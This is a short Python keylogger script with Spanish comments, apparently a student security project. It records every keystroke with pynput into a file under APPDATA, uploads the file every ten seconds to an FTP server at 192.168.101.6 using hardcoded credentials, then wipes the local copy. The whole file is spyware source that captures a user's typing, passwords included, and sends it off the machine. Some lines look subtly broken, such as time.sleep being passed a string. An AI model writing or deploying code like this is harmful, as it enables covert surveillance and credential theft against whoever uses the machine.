from pynput import keyboard
import os
import time
from ftplib import FTP
import datetime



def keyftp():
    appdata =  os.getenv('APPDATA')
    keyfile = appdata+'/keys_ftp.txt'
    segundos_espera = 10
    timeout = time.time()+ segundos_espera

    def TimeOut():
	    if time.time()> timeout:
		    return True
	    else:
		    return False

    def EnviarFTP():
        f = datetime.datetime.now().strftime(" %Y-%m-%d %H-%M-%S")
        ftp = FTP('192.168.101.6')#Direccion del servidor FTP
        ftp.login(user="FTP-User",passwd="proyectoseguridad2020")#Usuario y contraseña del servidor FTP
        ftp.cwd("keys")
        file = open(keyfile, 'rb')
        ftp.storlines('STOR keys{}.txt'.format(f),file)
        print("Enviado correctamente al servidor FTP")
        time.sleep("2")
        os.system("cls")
        file.close()
        file = open(keyfile,"r+")
        file.truncate(0)
        file.close()

    def on_key_press(key):
        f = open(keyfile,"a")
        keys = str(key)
        _key_ = keys.replace("'","").replace("\n","").replace("Key.enter","\n").replace("Key.space"," ").replace("Key.backspace","\nBACKSPACE\n")
        f.write(_key_)
        print(key)
    
    print("Registrando teclas...")
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    while True:
        if TimeOut():
            EnviarFTP()
            timeout = time.time()+ segundos_espera

